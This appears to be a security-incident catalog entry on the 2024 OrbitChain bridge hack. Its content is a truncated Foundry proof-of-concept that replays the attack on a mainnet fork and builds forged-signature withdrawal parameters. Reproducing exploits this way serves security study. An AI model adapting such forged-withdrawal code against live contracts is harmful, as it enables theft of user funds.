# [?] OrbitChain - Incorrect input validation

## Summary
Severity: Unknown
Chain: Ethereum
Component: OrbitChain
Published: 2024-01-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/OrbitChain_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~81M
References:
- https://blog.solidityscan.com/orbit-chain-hack-analysis-b71c36a54a69

```solidity
contract ContractTest is Test {
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IOrbitBridge private constant OrbitEthVault = IOrbitBridge(0x1Bf68A9d1EaEe7826b3593C20a0ca93293cb489a);
    address private constant orbitHubContractAddress = 0xB5680a55d627c52DE992e3EA52a86f19DA475399;
    address private constant orbitExploiterFromAddr = 0x9263e7873613DDc598a701709875634819176AfF;
    address private constant orbitExploiterToAddr = 0x9ca536d01B9E78dD30de9d7457867F8898634049;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_908_049);
        vm.label(address(WBTC), "WBTC");
        vm.label(address(OrbitEthVault), "OrbitEthVault");
        vm.label(orbitHubContractAddress, "orbitHubContractAddress");
    }

    function testExploit() public {
        deal(address(WBTC), orbitExploiterToAddr, 0);
        emit log_named_decimal_uint(
            "Exploiter WBTC balance before attack", WBTC.balanceOf(orbitExploiterToAddr), WBTC.decimals()
        );
        // At first exploiter has deposited some WBTC tokens (acquired from Uniswap) to Orbit in tx:
        // https://explorer.phalcon.xyz/tx/eth/0x9d1351ca4ede8b36ca9cd9f9c46e3b08890d13d94dfd3074d9bb66bbcc2629b1

        // Hash of the tx from Orbit chain. Details can be found at https://bridge.orbitchain.io/ explorer
        bytes32 orbitTxHash = 0xf7f60c98b04d45c371bcccf6aa12ebcd844fca6b17e7cd77503d6159d60a1aaa;
        bytes32[] memory bytes32s = new bytes32[](2);
        bytes32s[0] = sha256(abi.encodePacked(orbitHubContractAddress, OrbitEthVault.chain(), address(OrbitEthVault)));
        bytes32s[1] = orbitTxHash;

        // Values specific to fake signatures from attack tx
        uint256[] memory uints = new uint256[](3);
        uints[0] = 23_087_900_000; // token withdraw amount
        uints[1] = WBTC.decimals();
        uints[2] = 8735; // unique identifier for requesting bridging ex, depositId
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/OrbitChain_exp.sol_
